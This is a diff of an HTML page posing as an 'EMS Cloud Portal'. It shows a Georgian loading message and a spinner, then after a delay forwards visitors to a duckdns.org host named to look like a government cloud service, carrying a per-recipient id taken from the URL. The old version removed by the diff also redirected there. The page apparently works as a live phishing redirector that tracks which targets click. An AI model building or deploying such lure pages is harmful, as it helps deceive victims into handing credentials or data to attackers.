@@ -1,14 +1,54 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>EMS Cloud Portal</title>
-  <script>
-    var params = window.location.search;
-    window.location.href = "https://emis-cloud-gov.duckdns.org" + params;
-  </script>
+<meta charset="UTF-8">
+<title>EMS Cloud Portal</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    text-align: center;
+    padding-top: 100px;
+    background: #f5f5f5;
+    color: #333;
+  }
+
+  .spinner {
+    margin: 30px auto;
+    width: 50px;
+    height: 50px;
+    border: 5px solid #ccc;
+    border-top-color: #1a73e8;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+  }
+
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+
+  .message {
+    font-size: 18px;
+    margin-top: 20px;
+  }
+</style>
 </head>
 <body>
-  <p>Redirecting, please wait...</p>
+
+<div class="spinner"></div>
+<div class="message">გთხოვთ დაიცადოთ, გვერდი იტვირთება...</div>
+
+<script>
+  const params = new URLSearchParams(window.location.search);
+  const rid = params.get('rdi');
+
+  if (rid) {
+    setTimeout(() => {
+      window.location.href = "https://emis-cloud-gov.duckdns.org/?rid=" + rid;
+    }, 2000);
+  } else {
+    document.querySelector('.message').textContent = "URL პარამეტრი ვერ მოიძებნა!";
+  }
+</script>
+
 </body>
 </html>
